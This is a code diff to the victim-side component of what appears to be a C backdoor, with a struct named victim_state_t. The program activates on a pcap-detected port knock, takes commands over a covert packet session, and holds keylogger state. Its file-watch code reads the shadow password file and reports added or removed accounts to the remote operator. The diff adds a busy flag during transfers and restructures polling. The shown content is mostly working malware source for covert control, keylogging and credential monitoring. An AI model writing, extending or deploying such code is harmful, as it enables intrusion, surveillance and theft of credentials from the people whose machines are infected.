@@ -86,6 +86,7 @@ typedef struct {
     watch_state_t file_watch;
     watch_state_t directory_watch;
     volatile int stream_ack_received;
+    int busy;
 } victim_state_t;
 
 static volatile sig_atomic_t g_running = 1;
@@ -100,7 +101,6 @@ static int bind_udp_socket(uint16_t port);
 static void close_session_sockets(victim_state_t *state);
 static int run_victim(victim_state_t *state);
 static void poll_knock_state_pcap(victim_state_t *state);
-static void poll_session_state(victim_state_t *state);
 static void poll_watch_targets(victim_state_t *state);
 static void pcap_knock_handler(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);
 static void pcap_session_handler(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);
@@ -111,7 +111,6 @@ static void activate_session(victim_state_t *state, const struct in_addr *peer_a
 static void deactivate_session(victim_state_t *state, const char *reason);
 static void clear_upload_state(victim_state_t *state);
 static void clear_watch_targets(victim_state_t *state);
-static void pcap_session_handler(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);
 static int send_response(victim_state_t *state, const struct sockaddr_in *peer_addr, uint8_t command, const char *message);
 static int send_response_raw(victim_state_t *state, const struct sockaddr_in *peer_addr, uint8_t command, const uint8_t *payload, uint16_t payload_len);
 static int wait_for_stream_ack(victim_state_t *state);
@@ -185,6 +184,7 @@ static void init_state(victim_state_t *state) {
     state->expected_seq = SEQ_INIT;
     state->next_seq = SEQ_INIT;
     state->stream_ack_received = 0;
+    state->busy = 0;
     keylogger_state_init(&state->keylogger);
 }
 
@@ -309,7 +309,10 @@ static void close_session_sockets(victim_state_t *state) {
 static int run_victim(victim_state_t *state) {
     while (g_running) {
         if (state->session_active) {
-            poll_session_state(state);
+            pcap_dispatch(state->pcap_handle, 1, pcap_session_handler, (u_char *)state);
+            if (!state->session_active) {
+                continue;
+            }
             poll_watch_targets(state);
         } else {
             poll_knock_state_pcap(state);
@@ -335,13 +338,6 @@ static void poll_knock_state_pcap(victim_state_t *state) {
     }
 }
 
-static void poll_session_state(victim_state_t *state) {
-    pcap_dispatch(state->pcap_handle, -1, pcap_session_handler, (u_char *)state);
-    if (!state->session_active) {
-        return;
-    }
-}
-
 static void poll_watch_targets(victim_state_t *state) {
     watch_state_t current;
 
@@ -349,121 +345,128 @@ static void poll_watch_targets(victim_state_t *state) {
         return;
     }
 
+    if (!state->file_watch.active && !state->directory_watch.active) {
+        return;
+    }
+
     if (state->file_watch.active) {
         memset(&current, 0, sizeof(current));
-        if (snapshot_file_watch(state->file_watch.path, &current) != 0) {
-            if (state->file_watch.exists) {
-                send_watch_event(state, "File watch", state->file_watch.path, "target became unavailable");
-                state->file_watch.exists = 0;
-            }
-        } else if (!state->file_watch.exists) {
-            send_watch_event(state, "File watch", state->file_watch.path, "target became available");
-            state->file_watch.exists = 1;
-            state->file_watch.mtime = current.mtime;
-            state->file_watch.size = current.size;
-        } else if (state->file_watch.mtime != current.mtime || state->file_watch.size != current.size) {
-            char details[FILE_CHUNK];
+        {
+            int snap_result = snapshot_file_watch(state->file_watch.path, &current);
+            if (snap_result != 0) {
+                if (state->file_watch.exists) {
+                    send_watch_event(state, "File watch", state->file_watch.path, "target became unavailable");
+                    state->file_watch.exists = 0;
+                }
+            } else if (!state->file_watch.exists) {
+                send_watch_event(state, "File watch", state->file_watch.path, "target became available");
+                state->file_watch.exists = 1;
+                state->file_watch.mtime = current.mtime;
+                state->file_watch.size = current.size;
+            } else if (state->file_watch.mtime != current.mtime || state->file_watch.size != current.size) {
+                char details[FILE_CHUNK];
 
-            if (path_is_shadow(state->file_watch.path) && state->file_watch.shadow_snapshot[0] != '\0') {
-                FILE *fp = fopen(state->file_watch.path, "rb");
-                if (fp != NULL) {
-                    char new_contents[4096];
-                    size_t bytes = fread(new_contents, 1, sizeof(new_contents) - 1, fp);
-                    new_contents[bytes] = '\0';
-                    fclose(fp);
+                if (path_is_shadow(state->file_watch.path) && state->file_watch.shadow_snapshot[0] != '\0') {
+                    FILE *fp = fopen(state->file_watch.path, "rb");
+                    if (fp != NULL) {
+                        char new_contents[4096];
+                        size_t bytes = fread(new_contents, 1, sizeof(new_contents) - 1, fp);
+                        new_contents[bytes] = '\0';
+                        fclose(fp);
 
-                    int found_new = 0;
-                    snprintf(details, sizeof(details), "changed - ");
+                        int found_new = 0;
+                        snprintf(details, sizeof(details), "changed - ");
 
-                    char *nl = state->file_watch.shadow_snapshot;
-                    char *old_end_ptr = nl + strlen(nl);
-                    while (nl < old_end_ptr) {
-                        char *next_nl = strchr(nl, '\n');
-                        if (next_nl == NULL) break;
-                        *next_nl = '\0';
-                        char *colon = strchr(nl, ':');
-                        if (colon != NULL) {
-                            *colon = '\0';
-                            int line_len = (int)strlen(nl);
-                            *colon = ':';
-                            int found = 0;
-                            char *scan = new_contents;
-                            while (*scan != '\0') {
-                                if (strncmp(scan, nl, (size_t)line_len) == 0 &&
-                                    scan[line_len] == ':') {
-                                    found = 1;
-                                    break;
+                        char *nl = state->file_watch.shadow_snapshot;
+                        char *old_end_ptr = nl + strlen(nl);
+                        while (nl < old_end_ptr) {
+                            char *next_nl = strchr(nl, '\n');
+                            if (next_nl == NULL) break;
+                            *next_nl = '\0';
+                            char *colon = strchr(nl, ':');
+                            if (colon != NULL) {
+                                *colon = '\0';
+                                int line_len = (int)strlen(nl);
+                                *colon = ':';
+                                int found = 0;
+                                char *scan = new_contents;
+                                while (*scan != '\0') {
+                                    if (strncmp(scan, nl, (size_t)line_len) == 0 &&
+                                        scan[line_len] == ':') {
+                                        found = 1;
+                                        break;
+                                    }
+                                    scan++;
                                 }
-                                scan++;
-                            }
-                            if (!found) {
-                                size_t offset = sizeof(details) - strlen(details) - 1;
-                                if (offset > 0) {
-                                    *colon = '\0';
-                                    if (found_new > 0) strncat(details, ", ", offset);
-                                    strncat(details, "removed user ", offset);
-                                    strncat(details, nl, offset);
-                                    *colon = ':';
-                                    found_new++;
+                                if (!found) {
+                                    size_t offset = sizeof(details) - strlen(details) - 1;
+                                    if (offset > 0) {
+                                        *colon = '\0';
+                                        if (found_new > 0) strncat(details, ", ", offset);
+                                        strncat(details, "removed user ", offset);
+                                        strncat(details, nl, offset);
+                                        *colon = ':';
+                                        found_new++;
+                                    }
                                 }
                             }
+                            *next_nl = '\n';
+                            nl = next_nl + 1;
                         }
-                        *next_nl = '\n';
-                        nl = next_nl + 1;
-                    }
 
-                    nl = new_contents;
-                    char *new_end_ptr = nl + bytes;
-                    while (nl < new_end_ptr) {
-                        char *next_nl = strchr(nl, '\n');
-                        if (next_nl == NULL) break;
-                        *next_nl = '\0';
-                        char *colon = strchr(nl, ':');
-                        if (colon != NULL) {
-                            *colon = '\0';
-                            int line_len = (int)strlen(nl);
-                            *colon = ':';
-                            int found = 0;
-                            char *scan = state->file_watch.shadow_snapshot;
-                            while (*scan != '\0') {
-                                if (strncmp(scan, nl, (size_t)line_len) == 0 &&
-                                    scan[line_len] == ':') {
-                                    found = 1;
-                                    break;
+                        nl = new_contents;
+                        char *new_end_ptr = nl + bytes;
+                        while (nl < new_end_ptr) {
+                            char *next_nl = strchr(nl, '\n');
+                            if (next_nl == NULL) break;
+                            *next_nl = '\0';
+                            char *colon = strchr(nl, ':');
+                            if (colon != NULL) {
+                                *colon = '\0';
+                                int line_len = (int)strlen(nl);
+                                *colon = ':';
+                                int found = 0;
+                                char *scan = state->file_watch.shadow_snapshot;
+                                while (*scan != '\0') {
+                                    if (strncmp(scan, nl, (size_t)line_len) == 0 &&
+                                        scan[line_len] == ':') {
+                                        found = 1;
+                                        break;
+                                    }
+                                    scan++;
                                 }
-                                scan++;
-                            }
-                            if (!found) {
-                                size_t offset = sizeof(details) - strlen(details) - 1;
-                                if (offset > 0) {
-                                    *colon = '\0';
-                                    if (found_new > 0) strncat(details, ", ", offset);
-                                    strncat(details, "new user ", offset);
-                                    strncat(details, nl, offset);
-                                    *colon = ':';
-                                    found_new++;
+                                if (!found) {
+                                    size_t offset = sizeof(details) - strlen(details) - 1;
+                                    if (offset > 0) {
+                                        *colon = '\0';
+                                        if (found_new > 0) strncat(details, ", ", offset);
+                                        strncat(details, "new user ", offset);
+                                        strncat(details, nl, offset);
+                                        *colon = ':';
+                                        found_new++;
+                                    }
                                 }
                             }
+                            *next_nl = '\n';
+                            nl = next_nl + 1;
                         }
-                        *next_nl = '\n';
-                        nl = next_nl + 1;
-                    }
 
-                    if (found_new == 0) {
+                        if (found_new == 0) {
+                            snprintf(details, sizeof(details), "changed (size=%lld)", (long long)current.size);
+                        }
+
+                        memcpy(state->file_watch.shadow_snapshot, new_contents, bytes + 1);
+                    } else {
                         snprintf(details, sizeof(details), "changed (size=%lld)", (long long)current.size);
                     }
-
-                    memcpy(state->file_watch.shadow_snapshot, new_contents, bytes + 1);
                 } else {
                     snprintf(details, sizeof(details), "changed (size=%lld)", (long long)current.size);
                 }
-            } else {
-                snprintf(details, sizeof(details), "changed (size=%lld)", (long long)current.size);
-            }
 
-            send_watch_event(state, "File watch", state->file_watch.path, details);
-            state->file_watch.mtime = current.mtime;
-            state->file_watch.size = current.size;
+                send_watch_event(state, "File watch", state->file_watch.path, details);
+                state->file_watch.mtime = current.mtime;
+                state->file_watch.size = current.size;
+            }
         }
     }
 
@@ -866,13 +869,27 @@ static void pcap_session_handler(u_char *args, const struct pcap_pkthdr *header,
         state->stream_ack_received = 1;
     }
 
+    if (state->busy && parsed.command != CMD_ACK && parsed.command != CMD_DISCONNECT) {
+        printf("Command %s (0x%02x) skipped during busy transfer\n",
+               protocol_command_name(parsed.command),
+               parsed.command);
+        (void)src_port;
+        return;
+    }
+
     printf("Command %s (0x%02x) received from %s\n",
            protocol_command_name(parsed.command),
            parsed.command,
            src_ip);
 
+    if (parsed.command != CMD_ACK) {
+        state->busy = 1;
+    }
     if (process_command(state, &peer_addr, &parsed) != 0) {
         fprintf(stderr, "Command %s failed\n", protocol_command_name(parsed.command));
+    }
+    if (parsed.command != CMD_ACK) {
+        state->busy = 0;
     }
     (void)src_port;
 }
